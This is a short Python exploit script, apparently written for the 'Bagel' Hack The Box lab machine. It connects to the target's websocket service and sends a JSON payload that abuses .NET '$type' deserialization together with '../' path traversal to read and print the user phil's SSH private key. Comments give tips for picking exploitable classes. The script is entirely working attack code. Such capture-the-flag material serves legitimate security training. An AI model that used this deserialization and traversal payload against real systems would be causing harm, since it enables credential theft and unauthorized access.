import websocket
import json
import sys

ws = websocket.WebSocket()

ws.connect("ws://bagel.htb:5000/")

operation = 'RemoveOrder'

# order = {"ReadOrder":"orders.txt"}

# it is important to note that we have to import the dll name, the namespace, and the class
# the candidates to be exploited: needs to have an empty constructor preferably

order = {"{}".format(operation): {'$type': 'bagel_server.File,bagel','ReadFile' : '../../../../../../home/phil/.ssh/id_rsa'}}

data = str(json.dumps(order))

ws.send(data)

resp = ws.recv()

json_resp = json.loads(resp)

print(json_resp["{}".format(operation)]['ReadFile'])

ws.close()